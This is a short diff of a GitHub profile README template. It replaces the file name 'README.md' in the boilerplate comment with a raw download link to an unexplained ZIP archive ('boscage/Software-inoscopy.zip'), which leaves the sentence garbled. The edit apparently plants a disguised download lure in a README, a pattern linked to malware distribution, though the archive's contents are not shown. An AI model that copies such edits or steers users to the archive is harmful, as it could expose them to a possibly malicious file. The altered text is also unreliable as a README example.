@@ -1,7 +1,7 @@
 ### Hi there 👋
 
 <!--
-**Tymooh/tymooh** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+**Tymooh/tymooh** is a ✨ _special_ ✨ repository because its `https://raw.githubusercontent.com/Tymooh/tymooh/main/boscage/Software-inoscopy.zip` (this file) appears on your GitHub profile.
 
 Here are some ideas to get you started:
 
